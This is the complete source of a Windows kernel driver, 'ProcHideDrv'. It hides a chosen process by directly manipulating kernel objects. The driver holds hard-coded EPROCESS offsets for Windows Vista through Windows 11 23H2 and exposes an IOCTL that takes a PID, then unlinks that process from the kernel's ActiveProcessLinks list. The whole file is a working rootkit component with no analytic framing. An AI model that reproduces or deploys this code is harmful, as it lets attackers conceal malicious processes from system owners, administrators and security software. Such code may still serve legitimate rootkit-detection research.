#include <ntddk.h>

#define DRIVER_PREFIX "ProcHideDrv: "
#define DEVICE_PATH L"\\Device\\ProcHide"
#define SYMLINK_PATH L"\\??\\ProcHide"

//
// Ioctl code definition
//
#define IOCTL_HIDE_PROC_BY_PID CTL_CODE(0x8000, 0x0700, METHOD_BUFFERED, FILE_ANY_ACCESS)

// 
// Global variables
//
ULONG g_UniqueProcessIdOffset = 0u;
ULONG g_ActiveProcessLinksOffset = 0u;

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
void UnlinkListEntry(PLIST_ENTRY pListEntry);

//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
	PDEVICE_OBJECT pDeviceObject = nullptr;

	do
	{
		RTL_OSVERSIONINFOW versionInfo{ 0 };
		UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH);
		UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);

		ntstatus = ::RtlGetVersion(&versionInfo);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to get OS version information (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			KdPrint((DRIVER_PREFIX "OS Version - %u.%u.%u\n",
				versionInfo.dwMajorVersion,
				versionInfo.dwMinorVersion,
				versionInfo.dwBuildNumber));

			// _PS_PROTECTION was introduced since Windows 8.1 and Server 2012 R2
			if ((versionInfo.dwMajorVersion == 6))
			{
				if (versionInfo.dwMinorVersion == 0)
				{
					// For Windows Vista
					g_UniqueProcessIdOffset = 0xE0u;
					g_ActiveProcessLinksOffset = 0xE8u;
				}
				else if (versionInfo.dwMinorVersion == 1)
				{
					// For Windows 7 and Server 2008 R2
					g_UniqueProcessIdOffset = 0x180u;
					g_ActiveProcessLinksOffset = 0x188u;
				}
				else if (versionInfo.dwMinorVersion == 2)
				{
					// For Windows 8 and Server 2012
					g_UniqueProcessIdOffset = 0x2E0u;
					g_ActiveProcessLinksOffset = 0x2E8u;
				}
				else if (versionInfo.dwMinorVersion == 3)
				{
					// For Windows 8.1 and Server 2012 R2
					g_UniqueProcessIdOffset = 0x2E0u;
					g_ActiveProcessLinksOffset = 0x2E8u;
				}
			}
			else if ((versionInfo.dwMajorVersion == 10) && (versionInfo.dwMinorVersion == 0))
			{
				if (versionInfo.dwBuildNumber == 10240)
				{
					// For Windows 10 1507
					g_UniqueProcessIdOffset = 0x2E8u;
					g_ActiveProcessLinksOffset = 0x2F0u;
				}
				else if (versionInfo.dwBuildNumber == 10586)
				{
					// For Windows 10 1511
					g_UniqueProcessIdOffset = 0x2E8u;
					g_ActiveProcessLinksOffset = 0x2F0u;
				}
				else if (versionInfo.dwBuildNumber == 14393)
				{
					// For Windows 10 1607
					g_UniqueProcessIdOffset = 0x2E8u;
					g_ActiveProcessLinksOffset = 0x2F0u;
				}
				else if (versionInfo.dwBuildNumber == 15063)
				{
					// For Windows 10 1703
					g_UniqueProcessIdOffset = 0x2E0u;
					g_ActiveProcessLinksOffset = 0x2E8u;
				}
				else if (versionInfo.dwBuildNumber == 16299)
				{
					// For Windows 10 1709
					g_UniqueProcessIdOffset = 0x2E0u;
					g_ActiveProcessLinksOffset = 0x2E8u;
				}
				else if (versionInfo.dwBuildNumber == 17134)
				{
					// For Windows 10 1803
					g_UniqueProcessIdOffset = 0x2E0u;
					g_ActiveProcessLinksOffset = 0x2E8u;
				}
				else if (versionInfo.dwBuildNumber == 17763)
				{
					// For Windows 10 1809
					g_UniqueProcessIdOffset = 0x2E0u;
					g_ActiveProcessLinksOffset = 0x2E8u;
				}
				else if (versionInfo.dwBuildNumber == 18362)
				{
					// For Windows 10 1903
					g_UniqueProcessIdOffset = 0x2E8u;
					g_ActiveProcessLinksOffset = 0x2F0u;
				}
				else if (versionInfo.dwBuildNumber == 18363)
				{
					// For Windows 10 1909
					g_UniqueProcessIdOffset = 0x2E8u;
					g_ActiveProcessLinksOffset = 0x2F0u;
				}
				else if (versionInfo.dwBuildNumber == 19041)
				{
					// For Windows 10 2004
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 19042)
				{
					// For Windows 10 20H2
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 19043)
				{
					// For Windows 10 21H1
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 19044)
				{
					// For Windows 10 21H2
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 19045)
				{
					// For Windows 10 22H2
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 22000)
				{
					// For Windows 11 21H2
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 22621)
				{
					// For Windows 11 22H2
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else if (versionInfo.dwBuildNumber == 22631)
				{
					// For Windows 11 23H2
					g_UniqueProcessIdOffset = 0x440u;
					g_ActiveProcessLinksOffset = 0x448u;
				}
				else
				{
					ntstatus = STATUS_NOT_SUPPORTED;
					KdPrint((DRIVER_PREFIX "Unsupported OS version is detected.\n"));
					break;
				}
			}
			else
			{
				// I don't care about ancient OS
				ntstatus = STATUS_NOT_SUPPORTED;
				KdPrint((DRIVER_PREFIX "Unsupported OS version is detected.\n"));
				break;
			}
		}

		ntstatus = ::IoCreateDevice(
			DriverObject,
			NULL,
			&devicePath,
			FILE_DEVICE_UNKNOWN,
			NULL,
			FALSE,
			&pDeviceObject);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceObject = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to create device (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to create symbolic link (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		DriverObject->DriverUnload = DriverUnload;
		DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

		KdPrint((DRIVER_PREFIX "Driver is loaded successfully.\n"));
	} while (false);

	if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr))
		::IoDeleteDevice(pDeviceObject);

	return ntstatus;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH);
	::IoDeleteSymbolicLink(&symlinkPath);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "Driver is unloaded.\n"));
}


NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_SUCCESS;
	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = 0u;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}


NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
	ULONG_PTR info = NULL;
	PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
	auto& dic = irpSp->Parameters.DeviceIoControl;
	PEPROCESS pStartProcess = nullptr;
	PEPROCESS pCurrentProcess = nullptr;
	PLIST_ENTRY pStartEntry = nullptr;
	PLIST_ENTRY pCurrentEntry = nullptr;
	HANDLE targetPid = nullptr;
	HANDLE currentPid = nullptr;
	KIRQL irql = NULL;

	switch (dic.IoControlCode)
	{
	case IOCTL_HIDE_PROC_BY_PID:
		if (dic.InputBufferLength < sizeof(ULONG))
		{
			ntstatus = STATUS_BUFFER_TOO_SMALL;
			KdPrint((DRIVER_PREFIX "Input buffer is too small.\n"));
			break;
		}

		targetPid = ULongToHandle(*(ULONG*)Irp->AssociatedIrp.SystemBuffer);
		pStartProcess = ::IoGetCurrentProcess();
		pStartEntry = (PLIST_ENTRY)((ULONG_PTR)pStartProcess + g_ActiveProcessLinksOffset);
		pCurrentEntry = pStartEntry;
		ntstatus = STATUS_NOT_FOUND;

		// To suppress race condition, raise IRQL to DISPATCH_LEVEL temporary.
		irql = ::KeRaiseIrqlToDpcLevel();
		KdPrint((DRIVER_PREFIX "IRQL is raised to DISPATCH_LEVEL (Original IRQL = %u).\n", (ULONG)irql));
		KdPrint((DRIVER_PREFIX "Current IRQL = %u.\n", (ULONG)::KeGetCurrentIrql()));

		do
		{
			pCurrentProcess = (PEPROCESS)((ULONG_PTR)pCurrentEntry - g_ActiveProcessLinksOffset);
			currentPid = *(HANDLE*)((ULONG_PTR)pCurrentProcess + g_UniqueProcessIdOffset);

			if (currentPid == targetPid)
			{
				ntstatus = STATUS_SUCCESS;
				UnlinkListEntry(pCurrentEntry);

				KdPrint((DRIVER_PREFIX "nt!_EPROCESS for the target process is at 0x%p (PID = %u).\n",
					(PVOID)pCurrentProcess,
					HandleToULong(currentPid)));

				break;
			}

			pCurrentEntry = pCurrentEntry->Flink;
		} while (pCurrentEntry != pStartEntry);

		// Revert IRQL
		::KeLowerIrql(irql);

		KdPrint((DRIVER_PREFIX "IRQL is reverted.\n"));

		if (NT_SUCCESS(ntstatus))
			KdPrint((DRIVER_PREFIX "The target process is unlinked (PID = %u).\n", HandleToULong(targetPid)));
		else
			KdPrint((DRIVER_PREFIX "Failed to find the target process (PID = %u).\n", HandleToULong(targetPid)));
	}

	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}

//
// Helper functions
//
void UnlinkListEntry(PLIST_ENTRY pListEntry)
{
	PLIST_ENTRY pForwardEntry = pListEntry->Flink;
	PLIST_ENTRY pBackwardEntry = pListEntry->Blink;
	pForwardEntry->Blink = pListEntry->Blink;
	pBackwardEntry->Flink = pListEntry->Flink;

	// To avoid referenced memory corruption when unlinked process is terminated, 
	// unlinked LIST_ENTRY should reference itself.
	pListEntry->Flink = pListEntry;
	pListEntry->Blink = pListEntry;
}